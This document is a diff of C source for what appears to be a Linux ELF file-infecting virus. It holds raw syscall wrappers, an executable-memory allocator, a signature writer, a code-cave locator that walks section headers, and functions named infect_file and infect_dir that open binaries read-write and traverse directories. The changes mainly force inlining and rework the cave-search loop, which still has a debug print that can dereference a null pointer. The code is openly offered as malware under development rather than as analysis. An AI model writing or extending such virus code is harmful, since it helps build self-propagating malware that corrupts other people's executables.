@@ -32,32 +32,32 @@ typedef struct linux_dirent64 {
     char d_name[];           /* Filename (null-terminated) */
 } dirent64;
 
-inline void
+__attribute__((always_inline)) inline void
 ft_exit(int exit_code) {
     sys(SYS_exit, exit_code, 0, 0, 0, 0, 0);
 }
-inline int
+__attribute__((always_inline)) inline int
 ft_write(int fd, volatile void *ptr, size_t size) {
     return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
 }
-inline int
+__attribute__((always_inline)) inline int
 ft_read(int fd, volatile void *ptr, size_t size) {
     return sys(SYS_read, fd, (long)ptr, size, 0, 0, 0);
 }
 
-inline int
+__attribute__((always_inline)) inline int
 ft_lseek(int fd, off_t offset, int whence) {
     return sys(SYS_lseek, fd, (long)offset, whence, 0, 0, 0);
 }
 
-inline void
+__attribute__((always_inline)) inline void
 ft_print_one() {
     char a = '1';
     char b = '\n';
     ft_write(1, &a, 1);
     ft_write(1, &b, 1);
 }
-inline void
+__attribute__((always_inline)) inline void
 ft_print_zero() {
     char a = '0';
     char b = '\n';
@@ -66,27 +66,27 @@ ft_print_zero() {
 }
 
 #include <sys/mman.h>
-inline uint64_t
+__attribute__((always_inline)) inline uint64_t
 ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
     return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
 }
 
-inline void *
+__attribute__((always_inline)) inline void *
 ft_malloc(uint64_t size) {
     return (void *)ft_mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 }
 
-inline int
+__attribute__((always_inline)) inline int
 ft_open(char *path, int flags, mode_t mode) {
     return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
 }
 
-inline int
+__attribute__((always_inline)) inline int
 ft_getdents64(int fd, char dirp[], size_t count) {
     return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
 }
 
-inline file
+__attribute__((always_inline)) inline file
 file_mmap(int fd) {
     file file;
     int off = ft_lseek(fd, 0, SEEK_END);
@@ -98,7 +98,7 @@ file_mmap(int fd) {
 
     return file;
 }
-inline int
+__attribute__((always_inline)) inline int
 ft_strlen(volatile char *str) {
     int i = 0;
     while (str[i] != '\0')
@@ -106,7 +106,7 @@ ft_strlen(volatile char *str) {
     return (i);
 }
 
-inline int
+__attribute__((always_inline)) inline int
 ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
     const uint64_t NEEDLE_SIZE = ft_strlen(needle);
     int i = 0;
@@ -132,7 +132,7 @@ ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
     return (0);
 }
 
-inline int
+__attribute__((always_inline)) inline int
 ft_string_search_fd(int fd, volatile char *needle) {
     const uint64_t BUF_SIZE_WITHOUT_OVERLAP = 1000;
     const uint64_t NEEDLE_SIZE = ft_strlen(needle);
@@ -151,14 +151,14 @@ ft_string_search_fd(int fd, volatile char *needle) {
     return 0;
 }
 
-inline void
+__attribute__((always_inline)) inline void
 prints_str_nl(char *str) {
     ft_write(1, str, ft_strlen(str));
     char nl = '\n';
     ft_write(1, &nl, 1);
 }
 
-inline void
+__attribute__((always_inline)) inline void
 signature_fill(volatile char *buf) {
     buf[0] = 'f';
     buf[1] = 'a';
@@ -192,7 +192,7 @@ typedef struct code_cave {
     uint64_t size;
 } code_cave;
 
-inline Elf64_Shdr *
+__attribute__((always_inline)) inline Elf64_Shdr *
 get_next_section_header(uint64_t section_cur_end, file file) {
     Elf64_Ehdr *header = file.mem;
     Elf64_Shdr *section_header_table = file.mem + header->e_shoff;
@@ -212,7 +212,7 @@ get_next_section_header(uint64_t section_cur_end, file file) {
     return section_header_next;
 }
 
-inline int
+__attribute__((always_inline)) inline int
 code_caves_get(volatile code_cave code_caves[], volatile file file) {
     Elf64_Shdr *section_header = NULL;
     Elf64_Ehdr *header = file.mem;
@@ -220,16 +220,16 @@ code_caves_get(volatile code_cave code_caves[], volatile file file) {
 
     do {
         section_header = get_next_section_header(section_cur_end, file);
-        // unsigned long ahhhhhh = section_header->sh_offset + section_header->sh_size;
-        // if (section_header != NULL)
-        section_cur_end = section_header->sh_offset + section_header->sh_size;
-        // else
-        //     section_cur_end = file.size;
+        if (section_header != NULL)
+            section_cur_end = section_header->sh_offset + section_header->sh_size;
+        else
+            section_cur_end = file.size;
+        printf("anhhhhhhhh %lu\n", section_header->sh_offset);
     } while (section_header != NULL);
     return 0;
 }
 
-inline int
+__attribute__((always_inline)) inline int
 elf64_ident_check(volatile const Elf64_Ehdr *header) {
 
     if (header->e_ident[EI_MAG0] != ELFMAG0) return 1;
@@ -249,7 +249,7 @@ elf64_ident_check(volatile const Elf64_Ehdr *header) {
     return 0;
 }
 
-inline int
+__attribute__((always_inline)) inline int
 infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
     if (fd < 0) return (1);
@@ -278,7 +278,7 @@ infect_file(char *path) {
     return (0);
 }
 
-inline int
+__attribute__((always_inline)) inline int
 infect_dir(char *path) {
     int fd = ft_open(path, O_RDONLY, O_DIRECTORY);
 
